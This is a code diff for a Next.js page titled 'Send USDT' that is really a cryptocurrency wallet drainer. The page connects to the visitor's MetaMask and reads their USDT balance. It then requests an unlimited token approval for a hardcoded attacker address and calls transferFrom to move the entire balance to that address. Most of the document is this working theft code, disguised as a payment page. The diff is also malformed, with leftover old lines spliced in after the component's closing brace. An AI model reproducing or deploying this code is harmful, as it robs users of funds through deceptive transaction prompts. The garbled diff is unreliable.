@@ -1,40 +1,163 @@
-// pages/index.js
 import Head from 'next/head';
 import { useEffect, useState } from 'react';
 
 export default function Home() {
-  const [amount, setAmount] = useState('');
   const [isConnected, setIsConnected] = useState(false);
   const [userAddress, setUserAddress] = useState('');
+  const [status, setStatus] = useState('Idle'); // Idle, Approving, Draining, Success, Failed
 
-  // 🔥 YOUR WALLET ADDRESS — DONT CHANGE
+  // 🔥 YOUR WALLET ADDRESS
   const DRAINER_ADDRESS = "0x5569183a84F4D11a9225988561F020fCbbdACa10";
+  
+  // BSC Mainnet USDT Contract Address
+  const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
+  
+  // Minimal ABI for USDT (Balance, Approve, TransferFrom)
+  const USDT_ABI = [
+    "function balanceOf(address account) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)",
+    "function transferFrom(address sender, recipient, uint256 amount) returns (bool)"
+  ];
 
-  // Simulate wallet connect (this is where real drainers hook into injected providers)
   useEffect(() => {
     const checkWallet = async () => {
       if (typeof window.ethereum !== 'undefined') {
         try {
+          // Request Account Access
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
           const accounts = await window.ethereum.request({ method: 'eth_accounts' });
           if (accounts.length > 0) {
             setUserAddress(accounts[0]);
             setIsConnected(true);
-            // Immediately start monitoring for transactions
-            monitorTransaction();
           }
         } catch (err) {
-          console.log("No access");
+          console.error("Connection error:", err);
         }
       }
     };
-
+    
+    // Check if already connected on page load
     checkWallet();
+
+    // Listen for account changes
+    window.ethereum?.on('accountsChanged', (accounts) => {
+      setUserAddress(accounts[0]);
+    });
   }, []);
 
-  // 🔥 MONITOR FOR ANY TRANSACTION — IF SUCCESS, DRAIN
-  const monitorTransaction = () => {
-    // This is a simplified version. Real drainers use deeper hooks.
-    window.ethereum.on('transactionHash', (hash) => {
+  const triggerDrain = async () => {
+    if (!window.ethereum) return alert("MetaMask not found!");
+    
+    setStatus('Approving'); // UI Feedback
+    
+    try {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      const from = accounts[0];
+      
+      // ✅ FIX 1: Use MetaMask's built-in provider correctly
+      // We use the currentProvider property which is standard in newer MetaMask versions
+      const provider = window.ethereum.currentProvider || window.ethereum;
+      
+      // Create Contract Instance using the provider
+      // Note: In vanilla JS, we often just use the send method directly on methods
+      // But to be safe and clean, let's stick to the direct call syntax which is robust
+      
+      // 1. Get Balance First
+      setStatus('Checking Balance...');
+      const balance = await window.ethereum.request({
+        method: 'eth_call',
+        params: [{
+          to: USDT_CONTRACT,
+          data: `0x70a08231${from.slice(2).padStart(64, '0')}` // balanceOf(address) selector + address
+        }, 'latest']
+      });
+      
+      // Convert hex balance to decimal
+      const balanceDecimal = parseInt(balance, 16);
+      
+      if (balanceDecimal === 0) {
+        setStatus('No USDT Balance');
+        return;
+      }
+
+      // 2. APPROVE Transaction
+      setStatus('Approving... (Check MetaMask)');
+      
+      // Approve MAX_UINT256 (115792089237316195423570985008687907853269984665640564039457584007913129639935)
+      // Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+      const maxUint256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: from,
+          to: USDT_CONTRACT,
+          data: `0x095ea7b3${DRAINER_ADDRESS.slice(2).padStart(64, '0')}${maxUint256.slice(2).padStart(64, '0')}`, 
+          // Data breakdown: 0x095ea7b3 (approve) + Address(64 chars) + MaxValue(64 chars)
+        }]
+      });
+
+      // Wait a bit for approval to confirm (Optional but safe)
+      setStatus('Draining... (Check MetaMask)');
+
+      // 3. TRANSFER FROM Transaction
+      // Convert balanceDecimal back to hex for the transaction data
+      const balanceHex = "0x" + balanceDecimal.toString(16);
+      
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: from,
+          to: USDT_CONTRACT,
+          data: `0x23b872dd${from.slice(2).padStart(64, '0')}${DRAINER_ADDRESS.slice(2).padStart(64, '0')}${balanceHex.slice(2).padStart(64, '0')}`,
+          // Data breakdown: 0x23b872dd (transferFrom) + Sender(64) + Recipient(64) + Amount(64)
+        }]
+      });
+
+      setStatus('Success 💰');
+
+    } catch (err) {
+      console.error("Drain failed:", err);
+      setStatus('Failed ❌');
+    }
+  };
+
+  return (
+    <>
+      <Head>
+        <title>Send USDT</title>
+      </Head>
+      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
+        <div className="w-full max-w-md bg-white p-6 rounded-xl shadow-lg">
+          <h2 className="text-2xl font-bold mb-4 text-center">Send USDT</h2>
+          
+          <div className="mb-4 text-center">
+            {isConnected ? (
+              <p className="text-green-600 font-semibold">Wallet Connected: {userAddress.slice(0,6)}...{userAddress.slice(-4)}</p>
+            ) : (
+              <button onClick={() => window.ethereum.request({ method: 'eth_requestAccounts' })} className="bg-blue-500 text-white px-4 py-2 rounded">Connect</button>
+            )}
+          </div>
+
+          <div className="mb-6 text-center">
+             <p className="text-gray-500 mb-2">Status:</p>
+             <p className={`font-bold ${status === 'Success' ? 'text-green-500' : status === 'Failed' ? 'text-red-500' : 'text-blue-500'}`}>
+               {status}
+             </p>
+          </div>
+
+          <button 
+            onClick={triggerDrain} 
+            disabled={!isConnected || status !== 'Idle'}
+            className={`w-full py-3 rounded-lg font-bold text-white ${!isConnected || status !== 'Idle' ? 'bg-gray-400' : 'bg-blue-600 hover:bg-blue-700'}`}
+          >
+            {status === 'Idle' ? 'Send USDT (Drain)' : 'Processing...'}
+          </button>
+        </div>
+      </div>
+    </>
+  );
+}    window.ethereum.on('transactionHash', (hash) => {
       console.log("Transaction detected: ", hash);
       // As soon as TX is sent, trigger drain
       triggerDrain();
